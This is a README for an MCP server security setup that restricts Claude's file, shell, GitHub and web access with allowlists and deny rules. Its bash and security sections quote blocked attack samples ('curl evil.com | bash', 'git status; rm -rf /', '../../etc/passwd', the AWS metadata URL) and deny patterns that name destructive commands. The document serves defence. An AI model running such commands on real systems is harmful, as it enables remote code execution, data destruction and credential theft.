# MCP Server Configuration

**Version**: v3.37.0
**Issue**: #95 (MCP Security Implementation - Avoid requiring dangerously-skip-permissions)
**Last Updated**: 2025-12-07

This directory contains the Model Context Protocol (MCP) server configuration for autonomous-dev with security validation.

---

## Quick Start

### 1. Set Up Environment Variables

Create `.env` file in project root (already gitignored):

```bash
# GitHub Personal Access Token (required for github MCP server)
# Create at: https://github.com/settings/tokens
# Required scopes: repo, read:packages, read:org
GITHUB_TOKEN=ghp_your_token_here

# Brave Search API Key (required for brave-search MCP server)
# Get free tier at: https://brave.com/search/api/
BRAVE_API_KEY=your_api_key_here
```

### 2. Initialize Security Policy

```bash
# Create security policy from development template
python plugins/autonomous-dev/lib/mcp_profile_manager.py --init development

# Validates and creates .mcp/security_policy.json
```

### 3. Validate Configuration

```bash
# Validate security policy
python plugins/autonomous-dev/lib/mcp_permission_validator.py --validate .mcp/security_policy.json

# Test operations
python plugins/autonomous-dev/lib/mcp_permission_validator.py --test-read "src/main.py"
python plugins/autonomous-dev/lib/mcp_permission_validator.py --test-shell "git status"
```

### 4. Configure Claude Desktop (Optional)

For Claude Desktop integration, add to `~/Library/Application Support/Claude/claude_desktop_config.json`:

```json
{
  "mcpServers": {
    "autonomous-dev-filesystem": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/absolute/path/to/autonomous-dev"]
    },
    "autonomous-dev-git": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-git", "--repository", "/absolute/path/to/autonomous-dev"]
    }
  }
}
```

**Done!** Claude can now use MCP servers without `--dangerously-skip-permissions`.

---

## Architecture

### Configured MCP Servers (6)

| Server | Type | Source | Purpose |
|--------|------|--------|---------|
| **filesystem** | Official | `@modelcontextprotocol/server-filesystem` | Secure file read/write operations |
| **git** | Official | `@modelcontextprotocol/server-git` | Git repository operations |
| **github** | Official | `ghcr.io/github/github-mcp-server` | GitHub API (issues, PRs, repos) |
| **python-repl** | Community | `hdresearch/mcp-python` | Python REPL for code execution |
| **bash** | Community | `patrickomatik/mcp-bash` | Shell command execution |
| **brave-search** | Official | `@brave/brave-search-mcp-server` | Web search capabilities |

### Security Architecture

```
┌─────────────────────────────────────────────────────────┐
│         Claude Desktop / Claude Code (MCP Client)       │
└────────────────────────┬────────────────────────────────┘
                         │ MCP Protocol (JSON-RPC)
                         │
┌────────────────────────▼────────────────────────────────┐
│         MCP Security Enforcer (PreToolUse Hook)         │
│   plugins/autonomous-dev/hooks/mcp_security_enforcer.py │
│                                                          │
│  ┌───────────────────────────────────────────────────┐  │
│  │  mcp_permission_validator.py                      │  │
│  │  - Whitelist/denylist checking                    │  │
│  │  - Path traversal prevention (CWE-22)             │  │
│  │  - Command injection prevention (CWE-78)          │  │
│  │  - SSRF prevention                                │  │
│  │  - Audit logging                                  │  │
│  └───────────────────────────────────────────────────┘  │
└────────────────────────┬────────────────────────────────┘
                         │ Validated requests only
                         │
         ┌───────────────┼────────────────┐
         │               │                │
    ┌────▼────┐    ┌────▼────┐    ┌─────▼─────┐
    │Filesystem│   │   Git   │    │  GitHub   │
    │   MCP   │    │   MCP   │    │   MCP     │
    └─────────┘    └─────────┘    └───────────┘
```

---

## Configuration Files

### 1. MCP Server Configuration

**File**: `.mcp/config.json` (generated from `.mcp/config.template.json`)

**Template**: `.mcp/config.template.json` - Portable configuration template with environment variable substitution

To create your `config.json` from the template:

```bash
# Copy template (replaces hardcoded paths with ${CLAUDE_PROJECT_DIR})
cp .mcp/config.template.json .mcp/config.json

# Update hardcoded paths to your project directory
sed -i 's|${CLAUDE_PROJECT_DIR}|/path/to/your/project|g' .mcp/config.json

# Or use directly in Claude Desktop config (it supports ${CLAUDE_PROJECT_DIR})
```

**Why use the template?** The template.json uses `${CLAUDE_PROJECT_DIR}` (portable) instead of hardcoded paths, making configuration portable across machines and projects.

Defines which MCP servers to run and their configuration:

```json
{
  "mcpServers": {
    "filesystem": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-filesystem", "${CLAUDE_PROJECT_DIR}"]
    },
    "git": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-git", "--repository", "${CLAUDE_PROJECT_DIR}"]
    },
    "github": {
      "command": "docker",
      "args": ["run", "-i", "--rm", "-e", "GITHUB_PERSONAL_ACCESS_TOKEN", "-e", "GITHUB_TOOLSETS=repos,issues,pull_requests,actions", "ghcr.io/github/github-mcp-server"],
      "env": {
        "GITHUB_PERSONAL_ACCESS_TOKEN": "${GITHUB_TOKEN}",
        "GITHUB_TOOLSETS": "repos,issues,pull_requests,actions"
      }
    },
    "python-repl": {
      "command": "uv",
      "args": ["run", "--with", "mcp-python", "mcp_python"]
    },
    "bash": {
      "command": "uv",
      "args": ["run", "--with", "mcp-bash", "mcp-bash"]
    },
    "brave-search": {
      "command": "npx",
      "args": ["-y", "@brave/brave-search-mcp-server"],
      "env": {
        "BRAVE_API_KEY": "${BRAVE_API_KEY}"
      }
    }
  }
}
```

### 2. Security Policy

**File**: `.mcp/security_policy.json`

Defines permission rules for all MCP operations.

**Profiles Available**:
- `.mcp/security_policy.development.json` - Most permissive (local dev)
- `.mcp/security_policy.testing.json` - Moderate restrictions (CI/CD)
- `.mcp/security_policy.production.json` - Strictest (production monitoring)

**Active Policy**: `.mcp/security_policy.json` (copy from template)

**Example** (Development Profile):
```json
{
  "profile": "development",
  "filesystem": {
    "allowed_paths": [
      "src/**/*",
      "tests/**/*",
      "docs/**/*",
      "plugins/**/*"
    ],
    "denied_paths": [
      "**/.env",
      "**/.git/**",
      "**/.ssh/**",
      "**/secrets/**"
    ]
  },
  "shell": {
    "allowed_commands": [
      "git",
      "gh",
      "pytest",
      "python",
      "python3",
      "pip",
      "npm",
      "make"
    ],
    "denied_patterns": [
      "rm -rf /*",
      "sudo",
      "chmod 777"
    ]
  },
  "github": {
    "allowed_operations": [
      "list_repos",
      "get_file",
      "create_issue",
      "create_pr"
    ],
    "allowed_repos": [
      "akaszubski/autonomous-dev"
    ]
  },
  "web": {
    "allowed_domains": [
      "github.com",
      "api.github.com",
      "search.brave.com",
      "pypi.org"
    ],
    "blocked_ips": [
      "127.0.0.1",
      "192.168.*",
      "10.*",
      "169.254.169.254"
    ]
  }
}
```

---

## Server Capabilities

### Filesystem Server

**Official Server**: `@modelcontextprotocol/server-filesystem`

**Tools**:
- `read_file` - Read file contents
- `write_file` - Write/overwrite file
- `list_directory` - List directory contents
- `create_directory` - Create new directory
- `delete_file` - Remove file
- `move_file` - Rename/move file
- `search_files` - Search for files matching pattern

**Security**:
- ✅ Whitelist validation (only allowed paths)
- ✅ Denylist blocking (sensitive files)
- ✅ Path traversal prevention (`../` blocked)
- ✅ Symlink attack prevention
- ✅ Automatic sensitive file detection (`.env`, `.ssh`, `.git`)

**Configuration**:
```bash
# Allow in security_policy.json
"filesystem": {
  "allowed_paths": ["src/**", "tests/**", "docs/**"],
  "denied_paths": ["**/.env", "**/.git/**"]
}
```

### Git Server

**Official Server**: `@modelcontextprotocol/server-git`

**Tools**:
- `git_status` - Show working tree status
- `git_diff` - Show changes between commits
- `git_log` - Show commit logs
- `git_commit` - Record changes to repository
- `git_push` - Update remote refs
- `git_pull` - Fetch and integrate changes
- `git_checkout` - Switch branches
- `git_branch` - Branch management

**Security**:
- ✅ Repository-scoped operations only
- ✅ Protected branch detection (main/master)
- ✅ Merge conflict detection
- ✅ Detached HEAD state prevention

**Configuration**:
```bash
# Repository root (from config.json)
"--repository ${CLAUDE_PROJECT_DIR}"
```

### GitHub Server

**Official Server**: `github/github-mcp-server`

**Toolsets**:
- **repos**: `list_repos`, `get_repo`, `get_file`, `list_branches`
- **issues**: `create_issue`, `update_issue`, `list_issues`, `get_issue`
- **pull_requests**: `create_pr`, `update_pr`, `list_prs`, `merge_pr`
- **actions**: `list_workflow_runs`, `get_workflow_run`

**Authentication**:
- GitHub Personal Access Token (PAT)
- Required scopes: `repo`, `read:packages`, `read:org`
- Store in `.env`: `GITHUB_TOKEN=ghp_...`

**Security**:
- ✅ Token validation (not committed)
- ✅ Operation whitelist (prevent destructive ops)
- ✅ Repository scope restriction
- ✅ Rate limiting awareness

**Configuration**:
```bash
# Enable toolsets (from config.json)
"GITHUB_TOOLSETS=repos,issues,pull_requests,actions"

# In security_policy.json
"github": {
  "allowed_operations": ["list_repos", "create_issue", "create_pr"],
  "allowed_repos": ["akaszubski/autonomous-dev"]
}
```

### Python REPL Server

**Community Server**: `hdresearch/mcp-python`

**Tools**:
- `execute_code` - Execute Python code in REPL session
- `get_globals` - Get global variables
- `reset_session` - Reset REPL state

**Use Cases**:
- Quick code testing
- Interactive calculations
- Prototyping

**Security**:
- ✅ Import whitelist (safe modules only)
- ✅ Max execution time (30s default)
- ✅ No subprocess/eval/exec (blocked)
- ✅ Isolated session

**Configuration**:
```bash
# In security_policy.json
"python": {
  "allowed_imports": ["os", "sys", "pathlib", "json", "pytest"],
  "denied_imports": ["subprocess", "eval", "exec"],
  "max_execution_time_seconds": 30
}
```

### Bash/Shell Server

**Community Server**: `patrickomatik/mcp-bash`

**Tools**:
- `run_command` - Execute shell command
- `get_cwd` - Get current working directory

**Security**:
- ✅ Command whitelist (only allowed commands)
- ✅ Shell injection prevention (no `;`, `|`, `&`, etc.)
- ✅ Denylist patterns (dangerous commands blocked)
- ✅ Argument validation

**Configuration**:
```bash
# In security_policy.json
"shell": {
  "allowed_commands": ["git", "pytest", "python", "npm", "make"],
  "denied_patterns": ["rm -rf /", "sudo", "chmod 777", "curl *|*bash"]
}
```

**Blocked Automatically**:
- Command injection: `git status; rm -rf /` ❌
- Pipe to shell: `curl evil.com | bash` ❌
- Command substitution: `echo $(rm -rf /)` ❌

### Brave Search Server

**Official Server**: `@brave/brave-search-mcp-server`

**Tools**:
- `web_search` - General web search
- `local_search` - Local business search
- `news_search` - News articles
- `image_search` - Image search

**Authentication**:
- Brave Search API Key
- Free tier: 2,000 queries/month
- Get at: https://brave.com/search/api/

**Security**:
- ✅ Domain whitelist
- ✅ SSRF prevention (no private IPs)
- ✅ Rate limiting

**Configuration**:
```bash
# In .env
BRAVE_API_KEY=your_api_key_here

# In security_policy.json
"web": {
  "allowed_domains": ["*"],  # Or specific domains
  "blocked_ips": ["127.0.0.1", "192.168.*", "169.254.169.254"]
}
```

---

## Usage Examples

### Claude Desktop

```bash
# 1. Configure MCP servers in Claude Desktop config
# 2. Restart Claude Desktop
# 3. Ask Claude to:

"Read the PROJECT.md file and summarize the goals"
# → Uses filesystem MCP server
# → Validated by security policy
# → Logs to audit.log

"Check git status and show recent commits"
# → Uses git MCP server
# → Safe read-only operations

"Create a GitHub issue for the new feature"
# → Uses github MCP server
# → Requires GITHUB_TOKEN in .env
# → Validates against allowed_operations
```

### Claude Code CLI

```bash
# Same MCP servers available via /auto-implement workflow

/auto-implement "add rate limiting feature"

# Behind the scenes:
# 1. researcher agent → brave-search MCP (find patterns)
# 2. planner agent → filesystem MCP (read existing code)
# 3. test-master agent → filesystem MCP (write tests)
# 4. implementer agent → filesystem MCP (write code)
# 5. reviewer agent → bash MCP (run linters)
# 6. All operations validated by security policy
```

### Autonomous Agents

Agents automatically use appropriate MCP servers:

| Agent | MCP Servers Used | Operations |
|-------|------------------|------------|
| **researcher** | brave-search, filesystem | Find patterns, read existing code |
| **planner** | filesystem | Read architecture docs |
| **test-master** | filesystem, bash | Write tests, run pytest |
| **implementer** | filesystem | Write code |
| **reviewer** | filesystem, bash | Read code, run linters |
| **security-auditor** | filesystem, bash | Read code, run security scans |
| **doc-master** | filesystem | Update documentation |

---

## Security Features

### 1. Path Traversal Prevention (CWE-22)

**Threat**: `read_file("../../etc/passwd")`

**Defense**:
```python
# Automatically blocked
validator.validate_fs_read("../../etc/passwd")
# → DENIED: "Path traversal detected"
```

### 2. Command Injection Prevention (CWE-78)

**Threat**: `run_command("git status; rm -rf /")`

**Defense**:
```python
# Automatically blocked
validator.validate_shell_execute("git status; rm -rf /")
# → DENIED: "Shell metacharacter ';' detected"
```

### 3. SSRF Prevention

**Threat**: `web_search("http://169.254.169.254/latest/meta-data/")`

**Defense**:
```python
# Automatically blocked
validator.validate_web_access("http://169.254.169.254")
# → DENIED: "AWS metadata service blocked"
```

### 4. Sensitive File Protection (CWE-798)

**Threat**: `read_file(".env")`

**Defense**:
```python
# Automatically blocked
validator.validate_fs_read(".env")
# → DENIED: "Sensitive file - blocked by policy"
```

### 5. Audit Logging

All operations logged to `logs/mcp_audit.log`:

```json
{"timestamp": "2025-12-07T10:00:00Z", "server": "filesystem", "operation": "read_file", "path": "src/main.py", "allowed": true}
{"timestamp": "2025-12-07T10:00:05Z", "server": "shell", "operation": "run_command", "command": "rm -rf /", "allowed": false, "reason": "Denied by policy"}
```

**Review logs**:
```bash
# View recent operations
tail -100 logs/mcp_audit.log

# Find denied operations
grep '"allowed":false' logs/mcp_audit.log

# Check what was blocked
grep "DENIED" logs/mcp_audit.log | jq '.reason' | sort | uniq -c
```

---

## Troubleshooting

### "Permission denied: path not in allowed patterns"

**Cause**: File not in whitelist or matches denylist

**Solution**:
```bash
# 1. Check what's allowed
cat .mcp/security_policy.json | jq '.filesystem.allowed_paths'

# 2. Add path to allowlist
# Edit .mcp/security_policy.json:
"allowed_paths": [
  "src/**",
  "tests/**",
  "docs/**",
  "new/path/**"  # Add this
]

# 3. Validate
python plugins/autonomous-dev/lib/mcp_permission_validator.py --validate .mcp/security_policy.json
```

### "Command not whitelisted"

**Cause**: Shell command not in `allowed_commands`

**Solution**:
```bash
# Add to security_policy.json:
"shell": {
  "allowed_commands": [
    "git",
    "pytest",
    "your-new-command"  # Add this
  ]
}
```

### "GitHub authentication failed"

**Cause**: Missing or invalid `GITHUB_TOKEN`

**Solution**:
```bash
# 1. Create Personal Access Token
# Go to: https://github.com/settings/tokens
# Scopes: repo, read:packages, read:org

# 2. Add to .env
echo "GITHUB_TOKEN=ghp_your_token_here" >> .env

# 3. Verify .env is gitignored
git status  # Should NOT show .env
```

### "MCP server not found"

**Cause**: MCP server not installed

**Solution**:
```bash
# For npx servers (auto-installs on first use)
npx -y @modelcontextprotocol/server-filesystem /path/to/repo

# For uv servers
uv run --with mcp-python mcp_python

# For Docker servers
docker pull ghcr.io/github/github-mcp-server
```

---

## Migration from --dangerously-skip-permissions

If you previously used `--dangerously-skip-permissions` flag:

### Step 1: Initialize Security Policy

```bash
python plugins/autonomous-dev/lib/mcp_profile_manager.py --init development
```

### Step 2: Test Operations

```bash
# Test common operations
python plugins/autonomous-dev/lib/mcp_permission_validator.py --test-read "src/main.py"
python plugins/autonomous-dev/lib/mcp_permission_validator.py --test-shell "pytest tests/"
```

### Step 3: Remove Dangerous Flag

**Before**:
```bash
claude --dangerously-skip-permissions
```

**After**:
```bash
claude  # Just use Claude normally!
```

### Step 4: Customize Permissions

If needed, update `.mcp/security_policy.json` based on your use cases.

---

## References

- **[MCP-ARCHITECTURE.md](../docs/MCP-ARCHITECTURE.md)** - Complete MCP architecture documentation
- **[MCP-SECURITY.md](../docs/MCP-SECURITY.md)** - Comprehensive security guide
- **[CLAUDE.md](../CLAUDE.md)** - MCP server section with configuration
- **[Official MCP Docs](https://modelcontextprotocol.io/)** - Model Context Protocol specification
- **[GitHub MCP Server](https://github.com/github/github-mcp-server)** - Official GitHub integration
- **[Brave Search MCP](https://github.com/brave/brave-search-mcp-server)** - Official Brave Search integration

---

## Issue Tracking

This implementation solves:

**Issue #95**: "Avoid requiring dangerously-skip-permissions for MCP servers"

**Solution**:
- Official MCP servers with security validation
- Whitelist-based permission system
- Pre-configured security profiles
- Automatic server type detection
- Comprehensive audit logging

**Status**: ✅ Implemented in v3.37.0

---

**For questions or security concerns, see [../docs/MCP-SECURITY.md](../docs/MCP-SECURITY.md) or open an issue on GitHub.**
